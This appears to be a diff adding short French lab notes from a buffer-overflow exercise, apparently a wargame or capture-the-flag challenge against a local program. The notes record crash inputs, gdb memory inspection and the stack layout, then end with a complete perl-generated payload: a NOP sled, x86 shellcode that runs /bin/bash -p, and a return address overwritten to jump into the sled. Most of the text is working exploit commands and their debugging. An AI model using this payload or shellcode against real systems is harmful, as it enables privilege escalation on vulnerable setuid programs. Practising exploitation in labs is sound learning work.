@@ -1,0 +1,19 @@
+perl -e 'print "USERNAME=", "A"x300 ' > /tmp/msg
+ca plante dans fgets
+perl -e 'print "USERNAME=", "ABCD", "A"x124 ' > /tmp/msg
+break sur break *0x08048694 pour ne pas ecraser le filename
+avec gdb je cherche ma chaine de caractere ABCD : 
+searchmem ABCD
+adresse de la variable buff : 0xbffff83c
+adresse de la variable init.username : 0xbffffa34
+gdb : x/44xw 0xbffffa34 
+0x00000400 = 1024 décimal = UID
+0x00002892 = 10386 décimal = PID
+0x0804b008 = notre descripteur de fichier vue plus haut
+0xbffffc28 = EBP de main
+0x08048716 = Adresse de retour de main
+
+L’adresse de retour à écraser doit se trouver quelque part en amont de mon shell code (quelque part dans les NOP ). je recherche mon shell dans la mémoire. Cette adresse de destination sera (choisi arbitrairement) : 0xbffff84f
+
+perl -e 'print "USERNAME=", "\x90"x48,"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" , "\x90"x47, "\xff\x01\x01\x01" , "\xff\x01\x01\x01" , "\x08\xb0\x04\x08" , "AAAA"x6 , "\x28\xfc\xff\xbf", "\x4f\xf8\xff\xbf"' > /tmp/msg
+
